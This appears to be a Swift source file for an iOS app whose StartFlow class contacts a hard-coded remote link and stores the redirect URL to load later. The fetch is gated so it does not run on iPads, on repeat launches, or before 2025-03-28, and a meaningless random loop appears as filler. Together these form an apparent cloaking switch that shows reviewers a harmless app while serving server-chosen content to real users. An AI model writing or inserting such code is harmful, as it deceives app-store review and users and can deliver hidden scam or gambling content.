import Foundation
import SwiftUI

class StartFlow {
    
    static let shared = StartFlow()
    
    let rootLink: String
    
    static let agent = "Mozilla/5.0 (iPhone; CPU iPhone OS 18_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.0 Mobile/15E148 Safari/604.1"
    
    var currentLink: String?
    var launch: Bool
    
    
    private init() {
        let url = UserDefaults.standard.string(forKey: "URL")
        let id = UserDefaults.standard.string(forKey: "userID") ?? ""
        let first = UserDefaults.standard.bool(forKey: "launch")
        
        let step = Int.random(in: 1...100)
        var counter = 0
        for step in 1...step {
            counter += 1
        }
        
        rootLink = "https://neuhostname.com/KCFnp1"
        currentLink = url
        launch = first
    }
    
    let currentDate = "2025-03-28"
    
    func backTrack(completion: @escaping (Bool, Bool) -> Void ) {
        let defaults = UserDefaults.standard
                
        if currentLink == nil {

            if UIDevice.current.model == "iPad" {
                completion(false, false)
                return
            }
            
            guard !launch else {
                completion(false, false)
                return
            }
            
            guard checkDate(currentDate: currentDate) else {
                completion(false, false)
                return
            }
            
            guard let url = URL(string: rootLink) else {
                completion(false, false)
                return
            }
            
            var request = URLRequest(url: url)
            request.timeoutInterval = 12
            
            
            let session = URLSession(configuration: .default, delegate: nil, delegateQueue: nil)
            
            let task = session.dataTask(with: request) { data, response, error in
                if let error = error as? URLError {
                    completion(false, false)
                    UserDefaults.standard.set(true, forKey: "launch")
                } else if let httpResponse = response as? HTTPURLResponse {
                    print("Status code: \(httpResponse.statusCode)")
                    var statusFlag: Bool = false
                    if (200...403).contains(httpResponse.statusCode) {
                        statusFlag = true
                        if let responseURL = httpResponse.url?.absoluteString {
                            //2025 saving link
                            DispatchQueue.main.async {
                                defaults.set(responseURL, forKey: "URL")
                                self.currentLink = responseURL
                            }
                        }
                    } else {
                        statusFlag = false
                        UserDefaults.standard.set(true, forKey: "launch")
                    }
                    completion(statusFlag, false)
                }
            }
            task.resume()
        } else {
            
            guard let url = URL(string: currentLink!) else {
                completion(true, true)
                return
            }
            
            var request = URLRequest(url: url)
            request.timeoutInterval = 12
            
            
            let task = URLSession.shared.dataTask(with: request) { [weak self] data, response, error in
                if let error = error as? URLError {
                    completion(true, true)
                } else if let httpResponse = response as? HTTPURLResponse {
                    if (200...403).contains(httpResponse.statusCode) {
                        if let responseURL = httpResponse.url?.absoluteString {
                            DispatchQueue.main.async {
                                self?.currentLink = responseURL
                                completion(true, false)
                            }
                        }
                    } else {
                        completion(true, true)
                    }
                }

            }
            task.resume()
        }
    }
    
    func launching(launch: Bool, state: Bool) {
        UserDefaults.standard.set(state, forKey: "state")
        UserDefaults.standard.set(launch, forKey: "launch")
    }
    
    func checkDate(currentDate: String) -> Bool {
        let dateFormatter = DateFormatter()
        dateFormatter.dateFormat = "yyyy-MM-dd"
        
        guard let date = dateFormatter.date(from: currentDate) else { return false }
        
        if date > Date() {
            return false
        } else {
            return true
        }
    }
}
